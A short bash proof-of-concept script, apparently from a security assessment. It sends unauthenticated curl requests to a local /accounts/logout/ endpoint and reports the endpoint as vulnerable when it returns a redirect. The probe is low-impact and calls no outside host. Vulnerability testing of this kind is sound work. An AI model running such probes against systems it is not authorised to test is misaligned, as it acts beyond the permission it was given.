#!/bin/bash

# POC: Logout Endpoint Callable Without Authentication
# This script demonstrates that /accounts/logout/ accepts requests from unauthenticated users
# The endpoint should require authentication before processing logout

TARGET="http://localhost:8081"
LOGOUT_ENDPOINT="${TARGET}/accounts/logout/"

echo "=========================================="
echo "POC: Logout Endpoint Without Authentication"
echo "=========================================="
echo ""

# Test 1: Single logout request without any session/authentication
echo "[TEST 1] Logout request without authentication (no session cookie)"
echo "Command: curl -i ${LOGOUT_ENDPOINT}"
echo ""

RESPONSE=$(curl -s -i "${LOGOUT_ENDPOINT}")
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
LOCATION_HEADER=$(echo "$RESPONSE" | grep -i "^Location:" | head -n 1)

echo "Response:"
echo "$HTTP_STATUS"
echo "$LOCATION_HEADER"
echo ""

if echo "$HTTP_STATUS" | grep -q "302\|301"; then
    echo "✓ VULNERABLE: Endpoint accepted request and returned redirect (302/301)"
else
    echo "✗ NOT VULNERABLE: Endpoint did not return redirect"
    exit 1
fi

echo ""

# Test 2: Multiple consecutive logout attempts without authentication
echo "[TEST 2] Multiple consecutive logout attempts"
echo ""

for i in {1..3}; do
    echo "Attempt $i:"
    RESPONSE=$(curl -s -i "${LOGOUT_ENDPOINT}")
    HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
    echo "  Response: $HTTP_STATUS"
    
    if ! echo "$HTTP_STATUS" | grep -q "302\|301"; then
        echo "  ✗ Request failed (expected 302/301)"
        exit 1
    fi
done

echo ""
echo "✓ All attempts succeeded - endpoint does not require authentication"
echo ""

# Test 3: Verify the endpoint returns Location header (redirect behavior)
echo "[TEST 3] Verify redirect behavior"
echo ""

RESPONSE=$(curl -s -i "${LOGOUT_ENDPOINT}")
LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')

if [ -n "$LOCATION" ]; then
    echo "✓ Redirect location: $LOCATION"
else
    echo "✗ No redirect location found"
    exit 1
fi

echo ""
echo "=========================================="
echo "VULNERABILITY CONFIRMED"
echo "=========================================="
echo "The logout endpoint processes requests from unauthenticated users"
echo "Expected behavior: Reject or require authentication before logout"
echo "Actual behavior: Accepts and processes logout (HTTP 302 redirect)"
echo ""